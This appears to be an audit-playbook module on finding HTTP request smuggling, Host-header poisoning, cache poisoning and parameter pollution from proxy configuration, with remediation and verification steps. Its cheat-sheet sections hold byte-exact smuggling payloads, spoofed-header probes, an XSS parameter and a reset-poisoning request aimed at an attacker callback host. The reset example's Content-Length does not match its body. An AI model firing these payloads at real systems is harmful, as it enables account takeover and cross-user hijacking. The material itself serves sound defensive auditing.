---
name: aegis-http-protocol
description: Audit playbook module for detecting HTTP protocol-level attack surface in proxied internet-facing applications - request smuggling/desync, Host-header abuse, web cache poisoning/deception, parameter pollution, spoofable edge headers, and connection-semantics abuse - from repository configuration evidence.
category_slug: PROTO
cwe: [CWE-444]
owasp: A05:2021 – Security Misconfiguration
---

# HTTP Protocol Checks (PROTO)

## Scope & Objectives

- Cover protocol-layer attacks that exist because two HTTP parsers disagree about where one message ends and the next begins, or about which client-supplied header is authoritative:
  - **HTTP request smuggling** (CWE-444): CL.TE desync, TE.CL desync, TE obfuscation variants (malformed/duplicated/obs-folded `Transfer-Encoding`), H2→H1 downgrade ambiguity, CL.0 (backend ignores `Content-Length` on specific routes).
  - **Host-header attacks**: password-reset poisoning via `Host` / `X-Forwarded-Host`, routing confusion (vhost selection, default-server catch-all), SSRF-via-Host when an upstream is derived from the host value, and the bridge into cache attacks.
  - **Web cache poisoning and deception**: unkeyed headers reflected into responses, fat GET, reflection into `Set-Cookie` or redirects, extension-based cacheability rules abused by path-suffix tricks (`/settings/nonexistent.js`).
  - **HTTP parameter pollution (HPP)**: duplicate-parameter resolution divergence across stacks, split-brain between validation layer and business consumer.
  - **Header-based attack surface**: spoofable proxy-set internal headers (`X-Original-URL`, `X-Rewrite-URL`, `X-Forwarded-*`), overlong header/URI handling mismatches, `Expect`/`Trailer` edge cases, CRLF injection from app code (cross-ref INJ module for the code-level sink inventory).
  - **Connection semantics**: keep-alive pinning concepts; WebSocket upgrade hijacking is one line here and is fully covered by the API module (cross-ref API module).
- This module's findings are usually **configuration-level**, not code-level: the fix is almost always proxy/LB/cache configuration hardening, not application refactoring. Frame every deliverable accordingly.
- Code-audit posture: you normally cannot send live probes against production. The core method is therefore: build a front-end map from deployment artifacts, identify both sides of each hop, apply known desync-matrix reasoning per stack pair, and document ambiguity pairs as findings with config fixes. Dynamic payloads in Exploitation & Reproduction are for authorized lab verification only.

## Prerequisites & Vocabulary

Zero-background primer: the terms this module uses, one line each. Deeper plain-language
explanations for every class live in the repository GUIDE.md glossary.

- **request smuggling**: sneaking a second request past a proxy by exploiting two parsers disagreeing on where one message ends
- **Content-Length vs Transfer-Encoding**: the two ways HTTP marks a body's end; conflicts between them enable smuggling
- **keep-alive connection**: a reused network connection — required for a smuggled request to land on the next victim
- **cache key**: the request parts a cache uses to say "same request as before"
- **unkeyed header**: an input that changes the response but not the cache key, so one poisoned response is served to everyone
- **host-header poisoning**: the server building links or redirects from the attacker-chosen `Host` value
- **HPP (parameter pollution)**: sending the same parameter twice and layers disagreeing over which value counts
- **taint flow / source→sink**: path untrusted data travels from entry point to dangerous function
- **finding status**: Confirmed > Probable > Needs-Review; evidence rules in templates/finding-report.md

## Mental Model

### The framing ambiguity

HTTP/1.1 delimits requests by headers plus either a `Content-Length` byte count or chunked transfer encoding delimited by a final `0\r\n\r\n` terminator. RFC 9112 requires rejecting messages carrying conflicting framing signals, but real stacks have historically resolved conflicts by *precedence* instead of rejection. When a request traverses two parsers (front-end proxy, back-end app server) that resolve the conflict differently, an attacker can make one parser believe the request ended earlier than the other does. The bytes the back-end still considers "body" are re-interpreted, on the reused keep-alive connection, as the start of the next request on that connection.

```text
Client ──(hop 1)──> CDN / WAF ──(hop 2)──> Reverse proxy ──(hop 3)──> App server(s)
              parser A            parser B            parser C
```

Every arrow above is one parser pair. Desync at hop N means the attacker controls the first bytes of the *next* request processed at hop N+1 on that socket. Persistence requirement: the poisoned connection must be reused. No downstream keep-alive/pipelining = no smuggling primitive, only parsing-error noise.

### Queue displacement symptom

Once desynced, responses are delivered off-by-one relative to requests:

- The attacker's smuggled prefix executes as its own request; the *victim whose request lands next on that socket receives the response generated for the attacker's injected request* (for example a 404 for `/poison`, or content of a resource the attacker targeted).
- Inverted case: the victim's request body completes the attacker's smuggled request, so the *attacker's probe captures the victim's response*, including their session cookies if the injected path reflects them.
- Operational symptom visible in logs during authorized testing: bursts of unexplained 400/502 with malformed method names such as `GPOST` or `MEGET` in backend access logs - the classic signature of half-delivered smuggled prefixes.

### Cache model

A cache stores under a **key** (typically method + scheme + host + normalized path + selected query params + a few keyed headers) the full **content** (status line, all headers including `Set-Cookie`/`Location`, body). Any input that influences content but not the key is an unkeyed injection point: attacker sends it once, everyone requesting that key afterwards receives the attacker-flavored response. Deception flips direction: the *victim's own sensitive response* gets stored under a key strangers can fetch.

### Host model

Three independent consumers of the host value, each a distinct finding class when unvalidated:

1. Router/proxy vhost selection (`server_name`, ingress rules) - confusion and catch-all exposure.
2. Application link generation (reset emails, redirects, canonical URLs) - poisoning.
3. Upstream derivation (`proxy_pass http://$host`, dynamic origins) - SSRF-via-Host.

### HPP model

The same parameter name arriving twice forces the framework to collapse values (first-wins, last-wins, join-with-comma, array). Findings arise when two layers of the same app collapse differently - e.g., an authorization check reads the first occurrence while the business consumer reads the last.

## What To Check

Work through these checks in order; each builds on the previous.

1. **Build the front-end map first** from deployment artifacts (see Where To Look). Enumerate every client→proxy→app hop: CDN/WAF edge, LB, ingress controller, sidecar, app server. Record per hop: product, HTTP versions accepted upstream and downstream, keep-alive/pipelining posture, header-normalization behavior.
2. **For each hop ask: "do both sides parse ambiguous framing identically?"** Concretely, for each pair record: which message prefers `Transfer-Encoding` over `Content-Length`, whether malformed TE values are rejected or passed through, whether duplicate CL headers are rejected or summed/first-picked, and whether connections are reused downstream.
3. **Flag desync-enabling proxy config**: nginx `proxy_pass` to an `upstream` block with `keepalive` plus `proxy_http_version 1.1` (persistent reuse makes any backend parser divergence exploitable). Note that nginx defaults to `proxy_http_version 1.0` for proxied requests; its presence set explicitly is the marker of a tuned keepalive deployment.
4. **Check for duplicate/conflicting framing headers reaching the backend**: does any edge layer reject requests with both `Content-Length` and `Transfer-Encoding`, TE values with commas (`chunked, gzip`) or junk prefixes (`xchunked`), or obs-folded headers? Absence of rejection at every hop = documented ambiguity pair.
5. **Identify CL.0 candidates**: routes where the backend honors no body - POST handlers in framework routing tables that never read the request body (static file modules, some redirect endpoints, health checks). If the front-end forwards the body onto a kept-alive socket while the route never consumes it, the body becomes the next "request".
6. **Detect H2→H1 downgrade paths** qualitatively: ingress/controller or ALB configs terminating HTTP/2 but forwarding HTTP/1.1 upstream. Reason about re-serialization hazards (declared content-length vs actual DATA frames, pseudo-header handling such as duplicated or odd `:authority`/`:path` values) without asserting specific product-version behavior - mark Needs-Review against the deployed component versions.
7. **Trace Host consumption in app code**: grep link-building sinks using `Host`, `X-Forwarded-Host`, `getHost()`, `req.hostname`, `url_for`, `$_SERVER['HTTP_HOST']`, `request.host_url`. Any reset-email/password flow building absolute URLs from these without an allowlist = reset-poisoning finding.
8. **Trace Host consumption in proxy config**: `$host` / `$http_host` inside `proxy_pass`, dynamic origins in ingress controllers, catch-all default servers accepting unknown hosts, vhosts whose `server_name` list overlaps.
9. **Identify the caching layer and its key definition**: CDN provider configs in repo, `Cache-Control` emission points in code, response middleware setting cache headers, `Vary` usage. Evaluate: are all response-influencing inputs keyed? Is `Vary: User-Agent` present while UA-dependent content is actually absent (key fragmentation), or absent while content varies by UA (collisions)?
10. **Enumerate unkeyed-header reflections**: search code for reflection of `X-Forwarded-*`, `X-Host`, `Forwarded`, `X-Original-URL`, `X-Rewrite-URL` into responses, redirects, cookies, or access decisions; then verify whether the cache key includes them (normally it does not).
11. **Test duplicate-parameter resolution per stack** (table in Patterns & Signatures): locate auth/validation reads vs business-logic reads of the same parameter; flag split-brain pairs (checker first-wins, consumer last-wins or vice versa).
12. **Check spoofable internal-header trust**: app consuming `X-Original-URL`, `X-Rewrite-URL`, `X-HTTP-Method-Override`, trusted-client headers, while the edge has no rule stripping them on ingress. Also note overlong URI/header limit mismatches between proxy ACLs and app routing, and nonstandard handling of `Expect: 100-continue` and `Trailer` headers (briefly; escalate only when combined with framing ambiguity).

## Where To Look

### Deployment artifacts (build the front-end map here)

| Artifact | Glob / path pattern | What it tells you |
|---|---|---|
| docker-compose | `docker-compose*.yml`, `compose*.yaml` | service graph = hop map; image names identify proxies/apps |
| Kubernetes | `**/ingress*.yaml`, `**/*ingress*.yml`, Helm `values.yaml`, `kustomization.yaml` | ingress class + annotations (rewrite, timeout, http2), service hops |
| Nginx/Apache/HAProxy/Envoy confs | `**/*.conf`, `**/nginx/**`, `**/haproxy/**`, `**/envoy*.yaml`, `**/*.vcl` | direct parser config, keepalive blocks, header rules |
| Terraform LB/CDN | `**/*.tf` containing `aws_lb`, `aws_alb`, `aws_cloudfront_distribution`, `google_compute_target_https_proxy`, `google_compute_backend_service`, `azurerm_application_gateway`, `azurerm_front_door` | cloud edge presence, protocol policy per target group |
| CDN provider mentions | docs dir, README, `fastly`/`cloudflare`/`akamai` strings in IaC/scripts | which edge normalizes what |
| App server definitions | `Procfile`, `gunicorn.conf.py`, `uwsgi.ini`, `Dockerfile` CMD lines, `pom.xml`, `package.json` scripts | backend parser identity |

### Backend parser identification quick map

| Evidence in repo | Backend HTTP/1.1 parser family |
|---|---|
| `express` / `fastify` / bare `http.createServer` in package.json or source | Node.js core parser |
| `gunicorn`, `uvicorn`, `waitress`, `flask run`, Django `runserver` | Python WSGI/ASGI servers (behavior differs per server - Needs-Review) |
| `puma`, `unicorn`, `passenger`, Rails Gemfile | Ruby server family |
| spring-boot starter web (embedded Tomcat/Jetty), standalone `tomcat` | Java servlet container (Tomcat vs Jetty differ) |
| `php-fpm` pools, `fastcgi_pass` | FastCGI hop - framing handled by FPM, distinct protocol surface |
| ASP.NET (`*.csproj`, Kestrel mentions) | Kestrel |

### Code-level locations

- Password-reset/email templates: `grep` for `reset`, `password`, mailer views building absolute URLs.
- Redirect helpers and cookie-setting middleware (reflection sinks).
- Query parsing entry points and authorization middleware reading the same parameter names as business handlers.
- Response-header middleware emitting `Cache-Control`, `Vary`, `Location`.

## Patterns & Signatures

### Ripgrep signature block: discover front-end topology in any repo

```bash
rg -n --no-heading -g '!node_modules' -g '!vendor' -g '!dist' \
  -e 'proxy_pass\s+[^;]+;' \
  -e 'upstream\s+\w+\s*\{' \
  -e 'keepalive\s+\d+' \
  -e 'proxy_http_version' \
  -e 'fastcgi_pass|uwsgi_pass|ajp_pass|ProxyPass\s|mod_proxy_ajp|proxy_ajp' \
  -e 'ingressClassName|kubernetes\.io/ingress\.class' \
  -e 'nginx\.ingress\.kubernetes\.io/' \
  -e 'traefik\.ingress\.kubernetes\.io|traefik\.(?:http|routers|middlewares)' \
  -e '(aws_lb|aws_alb|aws_cloudfront_distribution|google_compute_target_https_proxy|google_compute_backend_service|azurerm_application_gateway|azurerm_front_door)\s+"?' \
  -e 'cloudflare|fastly|akamai|keycdn|cdn77' \
  -e 'server_name\s+' \
  -e 'default_server' \
  -e 'http2\s*;|ALPN|allowHttp10|protocolVersion' \
  -e 'X-Forwarded-(Host|Proto|For|Port)|Forwarded:' \
  -e 'X-Original-URL|X-Rewrite-URL|X-HTTP-Method-Override'
```

Interpretation: hits in the first group (nginx directives) + backend identity from Where To Look = one hop pair to run through the desync matrix. Ingress annotation hits reveal edge behavior (redirect/rewrite/timeout/http2). Terraform resource hits confirm a cloud LB whose normalization behavior must be verified against provider docs (Needs-Review), not assumed either way.

### Desync matrix by proxy pair

| Proxy pair | Desync risk | Config marker | Fix |
|---|---|---|---|
| nginx → Node.js (Express/Fastify) | Elevated historically: front-end prefers CL on conflict, Node parser history includes lenient TE/dup handling; current behavior Needs-Review per deployed versions | `upstream` block with `keepalive` + `proxy_http_version 1.1` + `proxy_set_header Connection ""` | Reject TE+CL conflicts at nginx (`map` + 400); or drop upstream keepalive for sensitive routes |
| nginx → Gunicorn / uvicorn / waitress | Moderate: Python servers vary in strictness; Needs-Review per server+version | same as above; also `proxy_buffering off` streaming routes | Same as above |
| nginx → php-fpm (FastCGI) | Low direct desync at this hop (FPM speaks FastCGI, not pipelined H1); front-end desync still possible | `fastcgi_pass` blocks | Edge normalization still applies |
| Apache httpd → Tomcat via AJP | Different protocol entirely: AJP smuggling/bypass class is separate (attribute injection, secret bypass) | `ProxyPass ... ajp://`, `mod_jk`, Tomcat `secretRequired="false"` | Require AJP secret, bind AJP to private network, prefer http/https connector |
| Envoy/Istio sidecar → app | Lower historically (strict codec options exist); Needs-Review per release | `envoy.yaml` `http_protocol_options`, `h1_codec_settings` | Enable strict header validation options |
| HAProxy → app | Low historically; strong normalization defaults | `option http-buffer-request`, `http-reuse` modes | Keep `http-reuse safe` semantics toward untrusted backends |
| Cloud LB (AWS ALB/CloudFront, GCP LB, Azure App GW) → origin | Generally normalized at edge; verify origin-side hop and TLS-origin path | terraform target-group protocol settings | Ensure origin does not re-introduce ambiguity behind the LB |
| Any → app with CL.0 route | Route-specific risk regardless of stack | POST route that never reads body + downstream keepalive | Read-and-discard body on such routes; disable keepalive per route |

Components with a documented desync track record - state family-level only, never assert version-CVE pairs: front-end proxies/load balancers that forward conflicting headers verbatim, back-end servers with lenient TE parsers (Node.js core parser history, several Java containers, various embedded servers), caching proxies, and commercial CDNs (normalization varies per product and plan tier - Needs-Review against vendor documentation).

### Payload cheat-sheet: framing probes

All requests below are byte-exact HTTP/1.1 text: every line break is CRLF, blank lines are bare CRLF pairs, and bodies are shown verbatim.

**CL.TE minimal displacement probe** (front-end honors `Content-Length: 6`, forwards exactly `0\r\n\r\nG`; back-end honoring TE ends the message at the `0\r\n\r\n` terminator, leaving `G` prefixed to the next request on that socket):

```http
POST / HTTP/1.1
Host: target.example
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

**CL.TE full second-request smuggle** (body length 53 = 5 bytes of `0\r\n\r\n` + 48-byte injected request `GET /404.html HTTP/1.1\r\nHost: target.example\r\n\r\n`; victim's next request is appended after it, so the victim receives the `/404.html` response - queue displacement):

```http
POST / HTTP/1.1
Host: target.example
Content-Length: 53
Transfer-Encoding: chunked

0

GET /404.html HTTP/1.1
Host: target.example

```

**TE.CL canonical probe** (front-end honors TE and relays the chunked body; back-end honors `Content-Length: 4`, consuming exactly `5c\r\n` and treating the remainder as a new request. The chunk size 0x5C = 92 bytes matches the embedded request exactly):

```http
POST / HTTP/1.1
Host: target.example
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

Note on TE.CL mechanics: some front-ends de-chunk and re-issue the body with their own Content-Length instead of relaying verbatim; the canonical probe targets the relay case. Classify which behavior your mapped edge exhibits before claiming exploitability - Needs-Review per product.

**TE obfuscation variants (TE.TE)** - each line is an attempt to make one parser see TE and the other not:

```text
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding:[tab]chunked
 Transfer-Encoding: chunked
Transfer-Encoding: chunked\r\nX-Ignore: x      (obs-fold continuation)
Transfer-Encoding: gzip, chunked
Transfer-Encoding: identity, chunked
X-Foo: bar\r\nTransfer-Encoding: chunked       (folded into previous header)
Content-Length: 5, 5                            (comma-list CL)
Content-Length: 0\r\nContent-Length: 7          (duplicate CL)
```

**CL.0 marker**: request whose route ignores its body - if the response returns immediately while `Connection: keep-alive` persists, subsequent body bytes may execute as a request.

**H2→H1 downgrade markers (qualitative)**: ingress/controller terminating h2 but proxying h1; look for declared content-length inconsistent with DATA frames, duplicated pseudo-headers, or oddities in `:authority`/`:path` re-serialization. Treat concrete impact as Needs-Review for the specific component versions deployed.

### Payload cheat-sheet: HPP test URLs

Send each pair and diff responses, auth decisions, and side effects; then reverse order:

```text
GET /api/profile?role=user&role=admin        -> which role governs the response?
GET /transfer?amount=100&amount=-100         -> which value is validated vs executed?
GET /search?q=safe&q=%3Cscript%3Ealert(1)%3C/script%3E   -> which value reaches output/log?
POST /action  body: action=read              plus query ?action=admin    -> query-vs-body precedence
GET /admin/dashboard?debug=false&debug=true  -> checker reads one, consumer the other?
```

Observation instructions: log which occurrence the validation layer saw (add temporary echo/debug in a lab) and which the business consumer used. Split-brain = finding even when both layers use the "same" framework accessor.

### Payload cheat-sheet: cache-poison probe header set

Request the same URL twice, varying only these headers; if response 2 reflects influence from request 1's header while URL was identical, the header is unkeyed and reflected - poison primitive confirmed:

```text
X-Forwarded-Host: attacker-callback.example
X-Forwarded-Scheme: http
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Host: attacker-callback.example
X-Original-URL: /admin
X-Rewrite-URL: /admin
Forwarded: for=127.0.0.1;host=attacker-callback.example
X-HTTP-Method-Override: DELETE
```

Reflection sinks to inspect: `Location` redirects, canonical-link tags, `Set-Cookie` domain/path attributes, generated email links, JSON self-referencing URLs.

### Payload cheat-sheet: reset-poison Host example

```http
POST /forgot-password HTTP/1.1
Host: attacker-callback.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

email=victim@example.com
```

Variant preserving legitimate Host: send `Host: target.example` plus `X-Forwarded-Host: attacker-callback.example`. Observable outcome: reset email delivered to victim contains `https://attacker-callback.example/reset?token=...` - the token leaks when the link is fetched or previewed.

## Taint Tracing Guidance

- **Sources (client-controlled, protocol level)**: `Host`, `X-Forwarded-*` family, `Forwarded`, `X-Original-URL`, `X-Rewrite-URL`, arbitrary custom headers (unkeyed candidates), duplicate query keys, duplicate form-body keys, GET request bodies (fat GET), `Trailer` header values.
- **Sinks ranked by severity**:
  1. Absolute URL construction feeding emails/redirects (`url_for(request.host_url ...)`, `${host}` in templates, `Url::to(request->getHost())`) - poisoning sinks.
  2. Proxy config interpolation of host into upstream selection (`proxy_pass http://$host`, ingress rewrite targets) - SSRF/routing sinks.
  3. Response reflection into `Location`, `Set-Cookie` attributes, HTML/JSON - cache-poisoning sinks when cacheable.
  4. Authorization decisions reading one occurrence of a parameter consumed elsewhere - HPP split-brain.
- **Trace rules**:
  - Header value → string concatenation into URL/header output without allowlist = finding; record whether any middleware normalizes the value and at which hop.
  - For HPP: identify the framework collapse rule (table below), locate every accessor site for the parameter name, flag files where two sites disagree in effective value under `?name=A&name=B`.
  - For cache poisoning: after confirming reflection, verify key definition (CDN docs/config, Vary list). Reflection keyed = not exploitable cross-user; document honestly.
- **Cross-reference**: CRLF injection into response headers originates in app code sinks - full sink inventory and language-specific payloads live in the INJ module; here only treat header-injecting inputs as additional smuggling-adjacent sources.

Framework duplicate-parameter collapse table (commonly documented; entries marked Needs-Review vary by parser configuration/version):

| Stack | Duplicate query param resolution |
|---|---|
| PHP (built-in SAPI) | Last wins |
| ASP.NET (classic and Core) | All values joined with commas |
| Java servlet (JSP/Spring @RequestParam String) | First wins |
| Django QueryDict | Last wins |
| Ruby on Rails | Last wins |
| Node.js Express | Parser-dependent: default parsers produce arrays for duplicates; effective behavior depends on consumption code - Needs-Review |
| Go net/http | Map of first-value slices; r.URL.Query().Get() returns first |

## Exploitation & Reproduction

**Static-first rule**: in a code audit, exploitation is primarily *config diffing against known-bad patterns* and documenting ambiguity pairs. Run dynamic procedures only in an authorized lab/staging environment. Every dynamic step below states its expected observable outcome; stop at the first deviation.

### Static-only confirmation path (default)

1. From the front-end map, write the hop chain as `edge(product) → proxy(product) → app(parser)`.
2. For each adjacent pair, diff their documented framing rules (vendor docs, RFC 9112 conflict handling) against the config actually deployed: does any layer reject TE+CL coexistence? Duplicate CL? Malformed TE? If no layer rejects and downstream keepalive exists, record finding: "potential desync: front prefers CL / back prefers TE - Needs-Review live confirmation".
3. Attach evidence: file paths and line numbers of `proxy_pass`, `keepalive`, ingress annotations, backend server identity.
4. Severity per Severity Assessment table, flagged as configuration-level with the Remediation directives.

### Dynamic procedures (authorized lab only)

1. **Baseline capture**: `curl --http1.1 -i https://lab.example/normal` - expect 200 and note `Connection` semantics.
2. **CL.TE displacement test** using the minimal probe above against a route you own:
   ```bash
   printf 'POST / HTTP/1.1\r\nHost: lab.example\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG' \
     | curl --http1.1 --raw -i --data-binary @- https://lab.example/probe
   ```
   Expected if desynced: your next request on a fresh connection receives an anomalous response (400/500 referencing malformed method), or backend logs show `GPOST`/`GGET`. Expected if normalized: clean 200/400 for the probe itself and normal behavior after.
3. **TE.CL displacement test**: send the canonical 5c probe with `curl --http1.1 --raw`; expected observable: subsequent request displaced (receives the smuggled request's response), or explicit 400 rejecting the conflicting headers on hardened stacks.
4. **Queue-displacement symptom description to confirm impact**: open one socket; send smuggle prefix, then a benign `GET /victim-canary`. If the canary's response body belongs to the injected path (`/404.html`, `/poison`), queue poisoning toward other users is demonstrated on that connection.
5. **Host/reset poisoning**: submit forgot-password with `Host: attacker-callback.example` (and separately `X-Forwarded-Host`). Expected vulnerable outcome: email link host equals attacker value. Inspect via a controlled mailbox in staging.
6. **Cache poison reflection**: request `/` twice through the cache with different `X-Forwarded-Host` values; expected vulnerable outcome: second cached response contains first request's host in links/canonical tags/cookies. Confirm persistence by fetching the URL from a third client without special headers.
7. **Web cache deception check**: authenticated victim session requests `/settings/decoy.js`; then unauthenticated fetch same URL. Expected vulnerable outcome when extension-based cacheability ignores `Set-Cookie`: personal settings HTML served to the anonymous client.
8. **HPP observation**: run the cheat-sheet URLs; diff role-gated fields and performed actions between orderings.

## Remediation

### Normalize framing at the edge (primary desync fix)

Choose one strategy per hop and apply it at the outermost layer that terminates HTTP/1.1 from clients:

- **Reject ambiguity outright**: 400 any request carrying both `Content-Length` and `Transfer-Encoding`, duplicate CL headers, or TE values other than exactly `chunked` (case-insensitive) on HTTP/1.1.
- **Or strip TE at the LB** for HTTP/1.1 backends: de-chunk and re-issue bodies with a single authoritative Content-Length.
- **Fallback per route**: disable upstream keep-alive where normalization cannot be guaranteed (each request gets a fresh backend socket - smuggling loses its delivery channel).

nginx shape:

```nginx
# VULNERABLE
upstream app_pool { server 10.0.0.5:8080; keepalive 32; }
server {
    listen 443 ssl;
    location / {
        proxy_pass http://app_pool;
        proxy_http_version 1.1;
        # nothing rejects ambiguous framing; junk TE values forwarded verbatim
    }
}
```

```nginx
# FIXED
map $http_transfer_encoding $bad_te {
    default                 0;
    "~,"                    1;   # comma lists: chunked, gzip
    "~[^[:space:]]"         1;   # reject unless handled below
}
server {
    listen 443 ssl;
    server_name app.example;
    ignore_invalid_headers on;        # drop malformed header names
    underscores_in_headers off;      # default: $http_ vars skip foo_bar headers;
                                     # deliberate choice - enabling it silently passes
                                     # underscore variants past header-based rules
    if ($http_transfer_encoding && $http_transfer_encoding !~* "^chunked$") {
        return 400;
    }
    if ($bad_te) { return 400; }
    location / {
        proxy_pass http://app_pool;
        proxy_http_version 1.1;
        proxy_set_header Connection "";
        proxy_set_header Transfer-Encoding "";   # edge owns framing; re-chunk itself
        proxy_request_buffering on;              # parse full request before forwarding
    }
}
```

Route-scoped alternative where buffering/streaming conflicts (SSE): `proxy_set_header Connection close;` or omit keepalive for that upstream so every proxied request uses a fresh backend connection.

### Host hardening

```nginx
# VULNERABLE
server {
    listen 80 default_server;
    return 301 https://$host$request_uri;   # echoes attacker Host into Location
}
```

```nginx
# FIXED
server {
    listen 80 default_server;
    server_name _;
    return 444;                              # catch-all: no vhost match -> drop
}
server {
    listen 80;
    server_name app.example;
    absolute_redirect off;                   # Location built from relative URI,
                                             # never from Host
    if ($host != "app.example") { return 444; }
}
```

Application side: build all absolute URLs from a configured base URL allowlist, never from request headers; treat `X-Forwarded-Host` as untrusted input even when the LB sets it legitimately (verify the LB overwrites rather than appends).

### Internal-header stripping rule at edge

Delete on ingress before routing, then set internally only what the architecture needs: `X-Original-URL`, `X-Rewrite-URL`, `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-HTTP-Method-Override`, plus any custom trusted-client headers the app honors. Overwrite (never append) `X-Forwarded-For`.

### Cache hardening

- Emit `Cache-Control: private, no-store` on every authenticated or personalized response; ensure the app wins over CDN defaults (respect `private`/`no-store` end-to-end).
- Cache key must include presence/value of `Authorization` (or key authenticated responses separately); never cache responses containing `Set-Cookie`.
- Fix `Vary` correctness: add `Vary: User-Agent` only when content truly varies by UA (otherwise it fragments keys without benefit); add `Vary: Accept-Encoding` where compression varies; remove misleading Vary entries.
- Disable "cache by extension regardless of headers" behaviors for dynamic routes (the WCD enabler); normalize paths before keying so suffix tricks collapse onto the real route.

### HPP fixes

- Pick one parameter-access convention per framework (e.g., servlet first-wins, Django last-wins) and funnel all access through a single helper.
- Validate before consumption: authorization/validation middleware must read the identical accessor used by business logic, or better, validate the full collapsed value list.
- At the gateway/WAF, reject duplicate occurrences of security-sensitive parameter names (role, amount, action, url) outright.

### Connection semantics

- Keep-alive pinning: avoid binding upstream sockets to client identity in ways an attacker can monopolize (documented pattern: long-held pinned connections starve others); cap reuse counts.
- WebSocket upgrade hijacking: enforce exact `Host`/`Origin` validation on `Upgrade` requests - details cross-ref API module.

## Verification & Validation

### Post-fix positive tests (must fail / be clean)

```bash
# 1. Ambiguous framing now rejected: expect HTTP 400 from the edge
curl --http1.1 --raw -i https://app.example/ \
  -H 'Content-Length: 6' -H 'Transfer-Encoding: chunked' --data-binary $'0\r\n\r\nG'

# 2. Obfuscated TE rejected: expect HTTP 400
curl --http1.1 --raw -i https://app.example/ \
  -H 'Transfer-Encoding: xchunked' --data-binary 'x=1'

# 3. Duplicate CL rejected: expect HTTP 400
curl --http1.1 --raw -i https://app.example/ \
  -H 'Content-Length: 0' -H 'Content-Length: 5' --data-binary ''

# 4. Unkeyed reflection gone: response must not contain attacker.example anywhere
curl -si "https://app.example/" -H 'X-Forwarded-Host: attacker.example' | rg -v '^X-' 
curl -si "https://app.example/" -H 'X-Original-URL: /admin' | head -n1   # must not grant admin view

# 5. Reset link host: submit forgot-password with poisoned Host in staging;
#    email link must show configured base URL, not attacker value.
```

Expected outcomes recorded per command; any 200 on commands 1-3 means a hop still forwards ambiguity - re-run the topology greps below and find which layer.

### Negative tests (legit traffic unaffected)

- **SSE/streaming**: `curl -N --no-buffer https://app.example/events` still streams incrementally after disabling upstream keepalive or enabling buffering changes per route.
- **Chunked uploads**: `curl --http1.1 -H 'Transfer-Encoding: chunked' --data-binary @large.bin https://app.example/upload` succeeds where TE is legitimately required (if TE stripping was deployed, confirm the LB re-chunks correctly rather than dropping the header blindly).
- **WebSocket handshake**: upgrade requests still succeed post Host-hardening (correct vhost, Origin allowlist).
- **CDN hit rate**: cache key changes (Authorization-presence) did not nuke hit rate for anonymous static content; sample two anonymous fetches and confirm `x-cache: hit` behavior consistent with vendor docs.

### Regression notes

- Stripping `Transfer-Encoding` carelessly breaks legitimate chunked uploads and streaming request bodies: strip only by de-chunk-and-reissue with correct Content-Length at a layer that buffers fully; never drop the header while forwarding a chunked body raw.
- `return 444` default_server: verify health-checker and monitoring probes target explicit server_names or they will silently break.
- `underscores_in_headers off`: apps relying on headers like `device_id` lose them - coordinate before toggling.
- HPP duplicate rejection: forms that legitimately repeat array fields (`tags[]=a&tags[]=b`, multi-select) must keep working - restrict rejection to plain-name duplicates.

### Greps to rerun after remediation

Rerun the full ripgrep signature block in Patterns & Signatures. Additionally:

```bash
rg -n 'Transfer-Encoding' --glob '*.conf'            # confirm no pass-through rules reintroduced
rg -n 'proxy_set_header\s+Connection'                 # cleared for keepalive pools
rg -n 'underscores_in_headers|ignore_invalid_headers' # deliberate values documented
rg -n 'absolute_redirect|default_server|return 444'
```

## Severity Assessment

| Finding class | Anchor severity | CVSS v3.1 anchor vector |
|---|---|---|
| Confirmed desync enabling request-queue poisoning toward other users | Critical | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| Cache poisoning persisting stored XSS or open redirect served cross-user | High | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N` |
| Password-reset poisoning (token leak → account takeover path) | High | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N` |
| Spoofable internal header reaching authorization decisions (X-Original-URL to hidden routes) | High | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` |
| Web cache deception exposing another user's personal page | High (scope-dependent: Medium if data is low-sensitivity) | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N` |
| HPP bypass of validation/business rule with bounded impact | Medium | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N` |
| Minor unkeyed reflections without persistence or cross-user reach | Low | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` |

Adjust upward when combined primitives chain (desync + cache = persistent cross-user payload injection without interaction). Downgrade dynamic-only claims that could not be confirmed statically to Needs-Review severity pending authorized testing.

## Common False Positives

- **Single-tier architectures without proxies**: app directly internet-facing (no nginx/LB/CDN hop in deployment artifacts) has no second parser, hence no desync surface. Document the absence honestly ("single parser: framing conflicts surface as parse errors, not smuggling") instead of forcing a finding.
- **HTTP/2-only paths end-to-end**: h2 binary framing carries explicit lengths end to end; most HTTP/1.1 smuggling classes are N/A. Only downgrade paths (h2 edge → h1 origin) re-enter scope.
- **CDNs normalizing headers transparently**: some providers strip/reject ambiguous framing or key unkeyed-looking headers by policy. Verify against the provider's current documentation and observed behavior; do not assume vulnerable or safe either way - mark Needs-Review when docs are inconclusive.
- **Keepalive configured but unused**: an `upstream keepalive` block with no traffic pattern reusing sockets (e.g., single-request scripts) removes the delivery channel; risk drops to theoretical unless load patterns change.

## References

- CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling') - https://cwe.mitre.org/data/definitions/444.html
- Amit Klein, 'HTTP Request Smuggling' whitepaper (Watchfire, 2005) - original desync mechanics reference.
- PortSwigger Web Security Academy, topic 'HTTP request smuggling' - search by title at https://portswigger.net
- PortSwigger Web Security Academy, topic 'Web cache poisoning' - search by title at https://portswigger.net
- PortSwigger Web Security Academy, topic 'Host header attacks' - search by title at https://portswigger.net
